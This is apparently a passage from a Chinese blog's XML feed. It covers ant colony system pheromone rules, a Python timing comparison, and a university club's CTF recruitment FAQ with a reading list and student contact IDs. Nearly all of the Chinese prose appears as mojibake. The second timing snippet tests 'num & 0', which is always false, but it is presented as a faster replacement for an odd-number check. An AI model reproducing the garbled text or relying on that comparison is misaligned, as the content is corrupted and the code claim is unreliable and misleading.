åªèš‚èšåœ¨å®ƒç»è¿‡çš„è¾¹ä¸Šé‡Šæ”¾çš„ä¿¡æ¯ç´ é‡(æ²¡æ”¾è¿‡å½“ç„¶å°±å– 0 å•¦ï¼), å®ƒç­‰äºèš‚èš k æœ¬è½®æ„å»ºè·¯å¾„é•¿åº¦çš„å€’æ•°</li><li>$C_{k}$ è¡¨ç¤ºè·¯å¾„é•¿åº¦, å®ƒæ˜¯ $R^{k}$ ä¸­æ‰€æœ‰è¾¹çš„é•¿åº¦å’Œ</li></ul></li></ul><h3 id="ACS-ä¸-AS-çš„ä¸åŒçš„ä¸‰ä¸ªæ–¹é¢å‚æ•°ä¸€è§ˆ"><a href="#ACS-ä¸-AS-çš„ä¸åŒçš„ä¸‰ä¸ªæ–¹é¢å‚æ•°ä¸€è§ˆ" class="headerlink" title="ACS ä¸ AS çš„ä¸åŒçš„ä¸‰ä¸ªæ–¹é¢å‚æ•°ä¸€è§ˆ"></a>ACS ä¸ AS çš„ä¸åŒçš„ä¸‰ä¸ªæ–¹é¢å‚æ•°ä¸€è§ˆ</h3><p>####çŠ¶æ€è½¬ç§»è§„åˆ™ï¼Œ</p><ul><li>ACSä¸­çš„ä¼ªéšæœºæ¯”ä¾‹è§„åˆ™(pseudorandom proportional): å¯¹äºæ¯åªèš‚èš k,<br>  è·¯å¾„è®°å¿†å‘é‡ $R^{k}$ æŒ‰ç…§è®¿é—®é¡ºåºè®°å½•äº†æ‰€æœ‰ k å·²ç»ç»è¿‡çš„ç¨‹åºåºå·</li></ul><ul><li>è®¾èš‚èš k å½“å‰æ‰€åœ¨åŸå¸‚ä¸º i, åˆ™ä¸‹ä¸€ä¸ªè®¿é—®åŸå¸‚:</li></ul><p>$$<br>j = \begin{cases}<br>arg ; max_{j \in J_{k}(i)} {[\tau(i, j) ], [\eta(i, j)^{\beta }]} &amp; \text , ; q \leqslant q_{0} \<br>S &amp; \text , ; other<br>\end{cases}<br>$$</p><ul><li><ul><li>$J_{k}(i)$ è¡¨ç¤ºä»åŸå¸‚ i å¯ä»¥ç›´æ¥åˆ°è¾¾çš„ä¸”åˆä¸åœ¨èš‚èšè®¿é—®è¿‡çš„åŸå¸‚åºåˆ— $R^{k}$ ä¸­çš„åŸå¸‚é›†åˆ</li><li>$\eta(i, j)$ æ˜¯ä¸€ä¸ªå¯å‘å¼ä¿¡æ¯, é€šå¸¸ç”± $\eta(i, j) = \frac{1}{d_{ij}}$ ç›´æ¥è®¡ç®—</li><li>$\tau(i, j)$ è¡¨ç¤ºè¾¹ (i, j) ä¸Šçš„ä¿¡æ¯ç´ é‡</li><li>$\beta$ æ˜¯æè¿°ä¿¡æ¯ç´ æµ“åº¦å’Œè·¯å¾„é•¿åº¦ä¿¡æ¯ç›¸å¯¹é‡è¦æ€§çš„æ§åˆ¶å‚æ•°</li><li>$q_{0}$ æ˜¯ä¸€ä¸ª [0, 1] åŒºé—´å†…çš„å‚æ•°, å½“äº§ç”Ÿçš„éšæœºæ•° $q \leqslant q_{0}$ æ—¶, èš‚èšç›´æ¥é€‰æ‹©ä½¿å¯å‘å¼ä¿¡æ¯ä¸ä¿¡æ¯ç´ é‡çš„ $\beta$ æŒ‡æ•°ä¹˜ç§¯æœ€å¤§çš„ä¸‹ä¸€åŸå¸‚èŠ‚ç‚¹, æˆ‘ä»¬é€šå¸¸ç§°ä¹‹ä¸ºå¼€å‘(exploitation); åä¹‹, å½“äº§ç”Ÿçš„éšæœºæ•° $q &gt; q_{0}$ æ—¶, ACSå°†å’Œå„ç§ASç®—æ³•ä¸€æ ·ä½¿ç”¨è½®ç›˜èµŒé€‰æ‹©ç­–ç•¥, å³åå‘æ¢ç´¢(biased exploration)</li></ul></li></ul><h4 id="ä¿¡æ¯ç´ å…¨å±€æ›´æ–°è§„åˆ™"><a href="#ä¿¡æ¯ç´ å…¨å±€æ›´æ–°è§„åˆ™" class="headerlink" title="ä¿¡æ¯ç´ å…¨å±€æ›´æ–°è§„åˆ™"></a>ä¿¡æ¯ç´ å…¨å±€æ›´æ–°è§„åˆ™</h4><ul><li>ä¸è®ºæ˜¯ä¿¡æ¯ç´ çš„è’¸å‘è¿˜æ˜¯é‡Šæ”¾, éƒ½åªåœ¨å±äºè‡³ä»Šæœ€ä¼˜è·¯å¾„çš„è¾¹ä¸Šè¿›è¡Œ</li></ul><p>$$<br>\tau(i, j) = (1 - \rho) \cdot \tau(i, j) + \rho \cdot \Delta \tau_{b}(i, j) , \forall (i, j) \in T_{b}<br>$$</p><ul><li><ul><li>$\Delta \tau_{b}(i, j) = \frac{1}{C_{b}}$</li><li>å‚æ•° $\rho$ ä»£è¡¨ä¿¡æ¯ç´ è’¸å‘çš„é€Ÿç‡, æ–°å¢åŠ çš„ä¿¡æ¯ç´  $\Delta \tau_{b}(i, j)$ è¢«ä¹˜ä¸Šç³»æ•° $\rho$ å, æ›´æ–°åçš„ä¿¡æ¯ç´ æµ“åº¦è¢«æ§åˆ¶åœ¨æ—§ä¿¡æ¯ç´ é‡ä¸æ–°é‡Šæ”¾çš„ä¿¡æ¯ç´ é‡ä¹‹é—´, ç”¨ä¸€ç§éšå«çš„åˆæ›´ç®€å•çš„æ–¹å¼å®ç°äº† MMAS ç®—æ³•ä¸­å¯¹ä¿¡æ¯ç´ é‡å–å€¼èŒƒå›´çš„é™åˆ¶</li></ul></li></ul><h4 id="ä¿¡æ¯ç´ å±€éƒ¨æ›´æ–°è§„åˆ™"><a href="#ä¿¡æ¯ç´ å±€éƒ¨æ›´æ–°è§„åˆ™" class="headerlink" title="ä¿¡æ¯ç´ å±€éƒ¨æ›´æ–°è§„åˆ™"></a>ä¿¡æ¯ç´ å±€éƒ¨æ›´æ–°è§„åˆ™</h4><p>$$<br>\tau(i, j) = (1 - \xi) \cdot \tau(i, j) + \xi \cdot \tau_{0}<br>$$</p><ul><li>$\xi$ æ˜¯ä¿¡æ¯ç´ å±€éƒ¨æŒ¥å‘é€Ÿç‡, æ»¡è¶³ $0 &lt; \xi &lt; 1$, é€šè¿‡å®éªŒå‘ç° $\xi = 0.1$ </li><li>$\tau_{0}$ æ˜¯ä¿¡æ¯ç´ çš„åˆå§‹å€¼, å–å€¼ä¸º $\frac{1}{nC^{nn}}$ æ—¶, å¯¹å¤§å¤šæ•°å®ä¾‹æœ‰ç€éå¸¸å¥½çš„æ€§èƒ½. å…¶ä¸­ n ä¸ºåŸå¸‚ä¸ªæ•°, $C^{nn}$ æ˜¯ç”±è´ªå©ªç®—æ³•æ„é€ çš„è·¯å¾„çš„é•¿åº¦</li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¦æ ¡è¯¾ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦æ ¡è¯¾ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½•ä¸€äº›æ‚ä¹±çš„ä¸œè¥¿</title>
      <link href="2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
      <url>2019/11/18/%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="èƒ½é‡æ˜¯æ ‡é‡è¿™å¥è¯æ„å‘³æ·±è¿œå‘€-ï½"><a href="#èƒ½é‡æ˜¯æ ‡é‡è¿™å¥è¯æ„å‘³æ·±è¿œå‘€-ï½" class="headerlink" title="èƒ½é‡æ˜¯æ ‡é‡è¿™å¥è¯æ„å‘³æ·±è¿œå‘€ ï½"></a>èƒ½é‡æ˜¯æ ‡é‡è¿™å¥è¯æ„å‘³æ·±è¿œå‘€ ï½</h4><p>ä¸€ç¾¤äººçº ç»“äº†ä¸€å¤©è¿™ä¸ªé¢˜ç›®çš„ç»“æœæ˜¯æ ‡é‡è¿˜æ˜¯çŸ¢é‡ï¼Œ23333</p><p><img src="/img/Memo/memo1.png" class="lazyload" data-srcset="/img/Memo/memo1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h4 id="äºŒè¿›åˆ¶çš„é­…åŠ›"><a href="#äºŒè¿›åˆ¶çš„é­…åŠ›" class="headerlink" title="äºŒè¿›åˆ¶çš„é­…åŠ›~"></a>äºŒè¿›åˆ¶çš„é­…åŠ›~</h4><p>è€ä¹…ä¹‹å‰ä¸€ç›´æƒ³è®°ä¸‹æ¥, ä¸€ç›´å¿˜äº†â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">time_start1 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate % <span class="number">2</span>) != <span class="number">0</span>:</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¹³å‡åœ¨è¿™ä¸ªæ•°å­— 2.133270025253296</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start1)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num_need_validate = <span class="number">123423</span></span><br><span class="line"></span><br><span class="line">cnt = <span class="number">10</span>**<span class="number">7</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">time_start2 = time.time()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt):</span><br><span class="line">    <span class="keyword">if</span> (num_need_validate &amp; <span class="number">0</span>) :</span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># å¹³å‡åœ¨è¿™ä¸ªæ•°å­— 0.8398542404174805</span></span><br><span class="line"><span class="built_in">print</span>(time.time() - time_start2)</span><br></pre></td></tr></table></figure><h4 id="linux-è¶£äº‹"><a href="#linux-è¶£äº‹" class="headerlink" title="linux è¶£äº‹"></a>linux è¶£äº‹</h4><p>ä¸€ç›´å¾ˆå¥½å¥‡ vim çš„  hjkl æ–¹å‘é”® ä»¥åŠ ~ ä¸ºä»€ä¹ˆæ˜¯æ ¹ç›®å½•â€¦<br><a href="https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys">https://catonmat.net/why-vim-uses-hjkl-as-arrow-keys</a></p>]]></content>
      
      
      <categories>
          
          <category> å°è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½›å¤§2019çº¢å¸½æ¯ç›¸å…³å’¨è¯¢</title>
      <link href="2019/10/18/2019hmb/"/>
      <url>2019/10/18/2019hmb/</url>
      
        <content type="html"><![CDATA[<h3 id="1-ä»€ä¹ˆæ˜¯CTF"><a href="#1-ä»€ä¹ˆæ˜¯CTF" class="headerlink" title="1.ä»€ä¹ˆæ˜¯CTF"></a>1.ä»€ä¹ˆæ˜¯CTF</h3><p>CTFï¼ˆCapture The Flagï¼‰ä¸­æ–‡ä¸€èˆ¬è¯‘ä½œå¤ºæ——èµ›ï¼Œåœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯ç½‘ç»œå®‰å…¨æŠ€æœ¯äººå‘˜ä¹‹é—´è¿›è¡ŒæŠ€æœ¯ç«æŠ€çš„ä¸€ç§æ¯”èµ›å½¢å¼ã€‚CTFèµ·æºäº1996å¹´DEFCONå…¨çƒé»‘å®¢å¤§ä¼šï¼Œä»¥ä»£æ›¿ä¹‹å‰é»‘å®¢ä»¬é€šè¿‡äº’ç›¸å‘èµ·çœŸå®æ”»å‡»è¿›è¡ŒæŠ€æœ¯æ¯”æ‹¼çš„æ–¹å¼ã€‚</p><h3 id="2-ä»€ä¹ˆæ˜¯çº¢å¸½æ¯"><a href="#2-ä»€ä¹ˆæ˜¯çº¢å¸½æ¯" class="headerlink" title="2.ä»€ä¹ˆæ˜¯çº¢å¸½æ¯"></a>2.ä»€ä¹ˆæ˜¯çº¢å¸½æ¯</h3><p>çº¢å¸½æ¯æ˜¯ç”±å¹¿ä¸œçœè®¡ç®—æœºä¿¡æ¯ç½‘ç»œå®‰å…¨åä¼šå°†äº2019å¹´11æœˆåœ¨å¹¿å·ä¸¾åŠç¬¬ä¸‰å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨æ”»é˜²ï¼ˆCTFï¼‰å¤§èµ›ã€‚</p><ul><li>æŠ¥åæ—¶é—´<br>10æœˆ10æ—¥00:00 - 11æœˆ07æ—¥24:00</li><li>åˆèµ›æ—¶é—´<br>11æœˆ10æ—¥09:00 - 11æœˆ11æ—¥09:00</li></ul><p>æŠ¥åå®˜æ–¹ç½‘ç«™ <a href="https://www.cinsa.org.cn/2019redhat">https://www.cinsa.org.cn/2019redhat</a></p><p>æ¬¢è¿å’¨è¯¢ä½›å¤§ä¿¡æ¯å®‰å…¨åä¼š</p><ul><li>å¾®ä¿¡å·ï¼š<ul><li>èŒƒåŒå­¦ï¼šfjw712452</li><li>åˆ˜åŒå­¦ï¼šGlan5812 </li><li>å¾åŒå­¦ï¼šGtari720</li></ul></li></ul><h3 id="3-å…¥é—¨CTFï¼Œä½ éœ€è¦ä»€ä¹ˆ"><a href="#3-å…¥é—¨CTFï¼Œä½ éœ€è¦ä»€ä¹ˆ" class="headerlink" title="3.å…¥é—¨CTFï¼Œä½ éœ€è¦ä»€ä¹ˆ"></a>3.å…¥é—¨CTFï¼Œä½ éœ€è¦ä»€ä¹ˆ</h3><ul><li><p>å¿«é€Ÿå­¦ä¹ æ–°äº‹ç‰©çš„èƒ½åŠ›<br>  ä¸€ä¸ªä¸ä¸€æ ·çš„æ€è€ƒæ–¹å¼<br>  ä¸€é¢—ä¹äºè§£å†³é—®é¢˜çš„å¿ƒ<br>  ä¸€äº›æœ‰è¶£çš„ç½‘ç»œå®‰å…¨æŠ€æœ¯<br>  ä¸€æ®µå……å®å¥‹æ–—çš„æ—¶å…‰</p></li><li><p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½ç»™äºˆä½ ä¸€äº›å»ºè®®ï¼š</p><p>  å–„ç”¨ Google æœç´¢å¯ä»¥å¸®åŠ©ä½ æ›´å¥½åœ°æå‡è‡ªå·±<br>  æŒæ¡è‡³å°‘ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œæ¯”å¦‚ Python<br>  å®è·µæ¯”ä»€ä¹ˆéƒ½è¦ç®¡ç”¨<br>  ä¿æŒå¯¹æŠ€æœ¯çš„å¥½å¥‡ä¸æ¸´æœ›å¹¶åšæŒä¸‹å»</p></li></ul><h3 id="4-CTFæ˜¯æ€ä¹ˆæ¯”èµ›çš„"><a href="#4-CTFæ˜¯æ€ä¹ˆæ¯”èµ›çš„" class="headerlink" title="4.CTFæ˜¯æ€ä¹ˆæ¯”èµ›çš„"></a>4.CTFæ˜¯æ€ä¹ˆæ¯”èµ›çš„</h3><p>ç”±äº CTF çš„è€ƒé¢˜èŒƒå›´å…¶å®æ¯”è¾ƒå®½å¹¿ï¼Œç›®å‰ä¹Ÿæ²¡æœ‰å¤ªæ˜ç¡®çš„è§„å®šç•Œé™è¯´ä¼šè€ƒå“ªäº›å†…å®¹ã€‚ä½†æ˜¯å°±ç›®å‰çš„æ¯”èµ›é¢˜å‹è€Œè¨€çš„è¯ï¼Œä¸»è¦è¿˜æ˜¯ä¾æ®å¸¸è§çš„ Web ç½‘ç»œæ”»é˜²ã€RE é€†å‘å·¥ç¨‹ã€Pwn äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨ã€Crypto å¯†ç æ”»å‡»ã€Mobile ç§»åŠ¨å®‰å…¨ ä»¥åŠ Misc å®‰å…¨æ‚é¡¹ æ¥è¿›è¡Œåˆ†ç±»ã€‚</p><h4 id="Web-ç½‘ç»œæ”»é˜²"><a href="#Web-ç½‘ç»œæ”»é˜²" class="headerlink" title="Web - ç½‘ç»œæ”»é˜²"></a>Web - ç½‘ç»œæ”»é˜²</h4><p>ä¸»è¦ä¸º Web å®‰å…¨ä¸­å¸¸è§çš„æ¼æ´ï¼Œå¦‚ SQL æ³¨å…¥ã€XSSã€CSRFã€æ–‡ä»¶åŒ…å«ã€æ–‡ä»¶ä¸Šä¼ ã€ä»£ç å®¡è®¡ã€PHP å¼±ç±»å‹ç­‰ï¼ŒWeb å®‰å…¨ä¸­å¸¸è§çš„é¢˜å‹åŠè§£é¢˜æ€è·¯ï¼Œå¹¶æä¾›äº†ä¸€äº›å¸¸ç”¨çš„å·¥å…·ã€‚</p><h4 id="Reverse-Engineering-é€†å‘å·¥ç¨‹"><a href="#Reverse-Engineering-é€†å‘å·¥ç¨‹" class="headerlink" title="Reverse Engineering - é€†å‘å·¥ç¨‹"></a>Reverse Engineering - é€†å‘å·¥ç¨‹</h4><p>ä¸»è¦ä¸ºé€†å‘å·¥ç¨‹ä¸­çš„å¸¸è§é¢˜å‹ã€å·¥å…·å¹³å°ã€è§£é¢˜æ€è·¯ï¼Œè¿›é˜¶éƒ¨åˆ†ä»‹ç»äº†é€†å‘å·¥ç¨‹ä¸­å¸¸è§çš„è½¯ä»¶ä¿æŠ¤ã€åç¼–è¯‘ã€åè°ƒè¯•ã€åŠ å£³è„±å£³æŠ€æœ¯ã€‚</p><h4 id="Pwn-äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨"><a href="#Pwn-äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" class="headerlink" title="Pwn - äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨"></a>Pwn - äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨</h4><p>Pwn é¢˜ç›®ä¸»è¦è€ƒå¯ŸäºŒè¿›åˆ¶æ¼æ´çš„å‘æ˜å’Œåˆ©ç”¨ï¼Œéœ€è¦å¯¹è®¡ç®—æœºæ“ä½œç³»ç»Ÿåº•å±‚æœ‰ä¸€å®šçš„äº†è§£ã€‚åœ¨ CTF ç«èµ›ä¸­ï¼ŒPWN é¢˜ç›®ä¸»è¦å‡ºç°åœ¨ Linux å¹³å°ä¸Šã€‚</p><h4 id="Crypto-å¯†ç æ”»å‡»"><a href="#Crypto-å¯†ç æ”»å‡»" class="headerlink" title="Crypto - å¯†ç æ”»å‡»"></a>Crypto - å¯†ç æ”»å‡»</h4><p>ä¸»è¦åŒ…æ‹¬å¤å…¸å¯†ç å­¦å’Œç°ä»£å¯†ç å­¦ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œå¤å…¸å¯†ç å­¦è¶£å‘³æ€§å¼ºï¼Œç§ç±»ç¹å¤šï¼Œç°ä»£å¯†ç å­¦å®‰å…¨æ€§é«˜ï¼Œå¯¹ç®—æ³•ç†è§£çš„è¦æ±‚è¾ƒé«˜ã€‚</p><h4 id="Mobile-ç§»åŠ¨å®‰å…¨"><a href="#Mobile-ç§»åŠ¨å®‰å…¨" class="headerlink" title="Mobile - ç§»åŠ¨å®‰å…¨"></a>Mobile - ç§»åŠ¨å®‰å…¨</h4><p>ä¸»è¦ä¸ºå®‰å“é€†å‘ä¸­çš„å¸¸ç”¨å·¥å…·å’Œä¸»è¦é—®é¢˜ç±»å‹ï¼Œå®‰å“é€†å‘å¸¸å¸¸éœ€è¦ä¸€å®šçš„å®‰å“å¼€å‘çŸ¥è¯†ï¼ŒiOS é€†å‘é¢˜ç›®åœ¨ CTF ç«èµ›ä¸­è¾ƒå°‘å‡ºç°ï¼Œå› æ­¤ä¸ä½œè¿‡å¤šä»‹ç»ã€‚</p><h4 id="Misc-å®‰å…¨æ‚é¡¹"><a href="#Misc-å®‰å…¨æ‚é¡¹" class="headerlink" title="Misc - å®‰å…¨æ‚é¡¹"></a>Misc - å®‰å…¨æ‚é¡¹</h4><p>ä»¥è¯¸è‘›å»ºä¼Ÿç¿»è¯‘çš„ã€Šçº¿ä¸Šå¹½çµï¼šä¸–ç•Œå¤´å·é»‘å®¢ç±³ç‰¹å°¼å…‹è‡ªä¼ ã€‹å’Œä¸€äº›å…¸å‹ MISC é¢˜ä¸ºåˆ‡å…¥ç‚¹ï¼Œå†…å®¹ä¸»è¦åŒ…æ‹¬ä¿¡æ¯æœé›†ã€ç¼–ç åˆ†æã€å–è¯åˆ†æã€éšå†™åˆ†æç­‰ã€‚</p><h3 id="5-CTFæ–¹å‘é‚£ä¹ˆå¤šï¼Œæˆ‘é€‰æ‹©é‚£ä¸€æ¡å‘¢"><a href="#5-CTFæ–¹å‘é‚£ä¹ˆå¤šï¼Œæˆ‘é€‰æ‹©é‚£ä¸€æ¡å‘¢" class="headerlink" title="5.CTFæ–¹å‘é‚£ä¹ˆå¤šï¼Œæˆ‘é€‰æ‹©é‚£ä¸€æ¡å‘¢"></a>5.CTFæ–¹å‘é‚£ä¹ˆå¤šï¼Œæˆ‘é€‰æ‹©é‚£ä¸€æ¡å‘¢</h3><ul><li><p>è¿™éœ€è¦ä½ è‡ªå·±é€‰æ‹©ä¸€ä¸ªé€‚åˆçš„æ–¹å‘ï¼Œä¸‹é¢æ˜¯å„ä¸ªæ–¹å‘çš„ä»‹ç»ã€‚</p><ul><li><p>Aæ–¹å‘ï¼šPWN+Reverse+Cryptoéšæœºæ­é…<br>  IDAå·¥å…·ä½¿ç”¨ï¼ˆf5æ’ä»¶ï¼‰ã€é€†å‘å·¥ç¨‹ã€å¯†ç å­¦ã€ç¼“å†²åŒºæº¢å‡ºç­‰</p></li><li><p>Bæ–¹å‘ï¼šWeb+Misc<br>  ç½‘ç»œå®‰å…¨ã€å†…ç½‘æ¸—é€ã€æ•°æ®åº“å®‰å…¨ç­‰</p></li><li><p>å…¬å…±éƒ¨åˆ†ï¼šLinuxåŸºç¡€ã€è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»ŸåŸç†ã€ç½‘ç»œåè®®åˆ†æ</p></li></ul></li><li><p>è¿™æ˜¯ç®€å•çš„ä»‹ç»ï¼Œå»é€‰æ‹©ä¸€æ¡å±äºè‡ªå·±çš„è·¯å§ï¼</p><ul><li>PWNã€Reverseåé‡å¯¹æ±‡ç¼–ã€é€†å‘çš„ç†è§£</li><li>Cryptoåé‡å¯¹æ•°å­¦ã€ç®—æ³•çš„æ·±å…¥å­¦ä¹ </li><li>Webåé‡å¯¹æŠ€å·§æ²‰æ·€ã€å¿«é€Ÿæœç´¢èƒ½åŠ›çš„æŒ‘æˆ˜</li><li>Miscæ¯”è¾ƒå¤æ‚ï¼Œæ‰€æœ‰ä¸è®¡ç®—æœºå®‰å…¨æŒ‘æˆ˜æœ‰å…³çš„éƒ½ç®—åœ¨å…¶ä¸­</li></ul></li></ul><h3 id="6-æˆ‘é€‰å¥½äº†è·¯ï¼Œä½†æ˜¯æ€ä¹ˆå»å­¦ä¹ å‘¢"><a href="#6-æˆ‘é€‰å¥½äº†è·¯ï¼Œä½†æ˜¯æ€ä¹ˆå»å­¦ä¹ å‘¢" class="headerlink" title="6.æˆ‘é€‰å¥½äº†è·¯ï¼Œä½†æ˜¯æ€ä¹ˆå»å­¦ä¹ å‘¢"></a>6.æˆ‘é€‰å¥½äº†è·¯ï¼Œä½†æ˜¯æ€ä¹ˆå»å­¦ä¹ å‘¢</h3><p>ä¸‹é¢æ¨èå‡ æœ¬ä¹¦ï¼š</p><ul><li><p>Aæ–¹å‘ï¼š<br>IDA proæƒå¨æŒ‡å—ï¼ˆé‡è¦ï¼‰<br>æ­ç§˜å®¶åº­è·¯ç”±å™¨0dayæ¼æ´æŒ–æ˜æŠ€æœ¯<br>RE for Beginnersï¼ˆé€†å‘å·¥ç¨‹å…¥é—¨ï¼‰<br>è‡ªå·±åŠ¨æ‰‹å†™æ“ä½œç³»ç»Ÿ<br>é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ï¼šç³»ç»Ÿå®æˆ˜ç¯‡</p></li><li><p>Bæ–¹å‘ï¼š<br>Webåº”ç”¨å®‰å…¨æƒå¨æŒ‡å—ï¼ˆé€‚åˆå°ç™½å…¥é—¨å¯¹WEBå®‰å…¨è¿›è¡Œå®è§‚çš„ç†è§£ï¼‰<br>é»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸ Webå®æˆ˜ç¯‡<br>Webå‰ç«¯é»‘å®¢æŠ€æœ¯æ­ç§˜<br>é»‘å®¢ç§˜ç±-æ¸—é€æµ‹è¯•å®ç”¨æŒ‡å—<br>ä»£ç å®¡è®¡ï¼šä¼ä¸šçº§Webä»£ç å®‰å…¨æ¶æ„</p></li></ul><h4 id="7-webã€Reverseã€PWNã€Cryptoå’ŒMiscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼è¯·æˆ³æˆ‘ï¼"><a href="#7-webã€Reverseã€PWNã€Cryptoå’ŒMiscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼è¯·æˆ³æˆ‘ï¼" class="headerlink" title="7.webã€Reverseã€PWNã€Cryptoå’ŒMiscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼è¯·æˆ³æˆ‘ï¼"></a>7.<a href="https://tari0510.github.io/2019/10/17/2019hmb_guide/">webã€Reverseã€PWNã€Cryptoå’ŒMiscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼è¯·æˆ³æˆ‘ï¼</a></h4><h3 id="8-æ€»ç»“"><a href="#8-æ€»ç»“" class="headerlink" title="8.æ€»ç»“"></a>8.<span id="ask_question">æ€»ç»“</span></h3><p>CTFå¯èƒ½é—¨æ§›æ¯”è¾ƒé«˜ï¼Œä½†æ˜¯å…¥é—¨ä¹‹åä½ ä¼šå‘ç°å…¶ä¹è¶£ åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­é‡åˆ°æŒ«æŠ˜ä¸è¦è½»æ˜“æ”¾å¼ƒï¼Œå»ºè®®å…ˆè°·æ­ŒæŸ¥æ‰¾ç›¸å…³èµ„æ–™ï¼Œå®åœ¨æŸ¥ä¸åˆ°å†æ±‚åŠ©ä»–äººã€‚ å…³äºå¦‚ä½•æé—®ï¼Œå»ºè®®é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼š<a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/master/README-zh_CN.md">æé—®çš„æ™ºæ…§</a> </p><p>æœ‰ä»»ä½•é—®é¢˜æ¬¢è¿åˆ°ç¾¤é‡Œæˆ–è”ç³»åä¼šæˆå‘˜ã€‚</p><h3 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h3><ul><li><p>Q1: è¦æ˜¯æˆ‘æŠ€æœ¯ä¸å¥½æˆ–è€…åŸºç¡€ä¸å¤ªå¥½æ€ä¹ˆåŠï¼Ÿä½ ä»¬ä¼šæ•™å—ï¼Ÿ</p></li><li><p>A1: ä¸ç”¨æ‹…å¿ƒï¼Œæˆ‘ä»¬ä¼šæ ¹æ®ä½ ä»¬å¤§éƒ¨åˆ†äººçš„åŸºç¡€ï¼Œç»™äºˆä½ ä»¬ç›¸å…³èµ„æ–™å’Œå¤šæ¬¡çº¿ä¸‹åŸ¹è®­ã€‚ä¸ç”¨æ‹…å¿ƒè‡ªå·±ä»€ä¹ˆéƒ½ä¸ä¼šï¼Œä¸€å¼€å§‹è°éƒ½æ˜¯å°ç™½ï¼Œæœ¬æ¬¡çº¢å¸½æ¯å‚èµ›åŒ†å¿™æ€•å–å¾—ä¸äº†å¥½æˆç»©çš„ï¼Œä¹Ÿå¯ä»¥ä¸º12æœˆä»½ç™¾åº¦æ¯ï¼Œæ˜å¹´1æœˆä»½å®‰æ’æ¯åšå‡†å¤‡å–”ï¼</p></li><li><p>Q2ï¼š æ•™ç»ƒï¼Œæˆ‘è¿«ä¸åŠå¾…æƒ³çœ‹çœ‹ctfå¤§æ¦‚æ˜¯æ€æ ·çš„</p></li><li><p>A2ï¼š è¿™ä¸ªæ˜¯ä¸­ç§‘å¤§çš„æ–°ç”Ÿctfèµ›ã€‚ç›¸å¯¹ä¼šç®€å•äº›çš„ã€‚å¦‚æœæœ‰è¿«ä¸åŠå¾…æƒ³äº†è§£ctfæ˜¯æ€æ 